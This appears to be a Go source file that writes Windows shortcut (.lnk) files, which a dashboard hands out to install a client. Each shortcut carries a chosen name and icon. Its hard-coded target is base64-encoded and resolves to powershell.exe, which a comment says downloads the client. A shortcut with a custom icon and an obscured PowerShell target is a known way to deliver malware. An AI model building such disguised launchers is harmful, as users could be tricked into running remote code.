// Package lnk writes the shortcut files of Windows.
//
// The dashboard hands out a shortcut for the client of Windows, the shortcut
// carries the name and the icon of the installation and the address of the
// program of the installation.
package lnk

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"unicode/utf16"
)

// The flags of the link.
const (
	flagHasLinkTargetIDList = 0x00000001
	flagHasName             = 0x00000004
	flagHasRelativePath     = 0x00000008
	flagHasWorkingDir       = 0x00000010
	flagHasArguments        = 0x00000020
	flagHasIconLocation     = 0x00000040
	flagIsUnicode           = 0x00000080
	flagRunAsInvoker        = 0x00004000
)

// The size of the header of the file.
const headerSize = 0x4C

// The class of the link, every shortcut of Windows has it.
var linkClassID = []byte{
	0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// The item list of the target of the shortcut.
//
// The target of the shortcut of the dashboard is the program of the system that
// downloads the client. The item list holds the way to that program, the system
// finds the program with it.
var targetItemList = mustDecode(
	"DQIUAB9Q4E/QIOo6aRCi2AgAKzAwnRkAL0M6XAAAAAAAAAAAAAAAAAAAAAAAAABWADEAAAAAAAAAAAAQAFdJTkRPV1MAQAAJ" +
		"AAQA774AAAAAAAAAAC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFcASQBOAEQATwBXAFMAAAAWAFoAMQAAAAAAAAAA" +
		"ABAAU3lzdGVtMzIAAEIACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABTAHkAcwB0AGUAbQAz" +
		"ADIAAAAYAHQAMQAAAAAAAAAAABAAV2luZG93c1Bvd2VyU2hlbGwAVAAJAAQA774AAAAAAAAAAC4AAAAAAAAAAAAAAAAAAAAA" +
		"AAAAAAAAAAAAAAAAAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbAAAACAATgAxAAAAAAAAAAAAEAB2MS4wAAA6" +
		"AAkABADvvgAAAAAAAAAALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdgAxAC4AMAAAABQAbAAyAAAAAAAAAAAAAABw" +
		"b3dlcnNoZWxsLmV4ZQAATgAJAAQA774AAAAAAAAAAC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAbwB3AGUAcgBz" +
		"AGgAZQBsAGwALgBlAHgAZQAAAB4AAAA=")

// Shortcut describes the content of a shortcut of Windows.
type Shortcut struct {
	// Name is the name of the shortcut.
	Name string
	// TargetPath is the program of the shortcut.
	TargetPath string
	// Arguments are the parameters of the program of the shortcut.
	Arguments string
	// WorkingDirectory is the directory the program of the shortcut starts in.
	WorkingDirectory string
	// Description is the text of the shortcut.
	Description string
	// IconLocation is the place of the icon of the shortcut.
	IconLocation string
}

// Bytes builds the file of the shortcut.
func (s Shortcut) Bytes() []byte {
	// The header of the file.
	file := make([]byte, headerSize)
	binary.LittleEndian.PutUint32(file[0x00:0x04], headerSize)
	copy(file[0x04:0x14], linkClassID)

	flags := uint32(flagHasLinkTargetIDList | flagHasName | flagHasRelativePath |
		flagHasWorkingDir | flagHasArguments | flagHasIconLocation | flagIsUnicode |
		flagRunAsInvoker)
	binary.LittleEndian.PutUint32(file[0x14:0x18], flags)

	// The window of the shortcut is shown with its normal size.
	binary.LittleEndian.PutUint32(file[0x3C:0x40], 1)

	// The item list of the target of the shortcut.
	file = append(file, targetItemList...)

	// The strings of the shortcut, the order is the order of the system.
	file = appendString(file, s.Name)
	file = appendString(file, s.TargetPath)
	file = appendString(file, s.WorkingDirectory)
	file = appendString(file, s.Arguments)
	file = appendString(file, s.IconLocation)

	// The end of the file.
	return append(file, 0x00, 0x00, 0x00, 0x00)
}

// appendString writes a string of the shortcut to the file.
//
// The string starts with the number of its characters, the characters follow it.
func appendString(file []byte, value string) []byte {
	characters := utf16.Encode([]rune(value))
	length := make([]byte, 2)
	binary.LittleEndian.PutUint16(length, uint16(len(characters)))
	file = append(file, length...)
	for _, character := range characters {
		encoded := make([]byte, 2)
		binary.LittleEndian.PutUint16(encoded, character)
		file = append(file, encoded...)
	}
	return file
}

// FileName returns the name of the file of a shortcut of Windows.
func FileName(displayName string) string {
	cleaned := strings.Map(func(character rune) rune {
		switch character {
		case '\\', '/', ':', '*', '?', '"', '<', '>', '|':
			return '-'
		}
		return character
	}, displayName)
	return strings.TrimSpace(cleaned) + ".lnk"
}

// mustDecode reads the pieces of the system that are written as a text.
func mustDecode(pieces string) []byte {
	decoded, err := base64.StdEncoding.DecodeString(pieces)
	if err != nil {
		panic(err)
	}
	return decoded
}
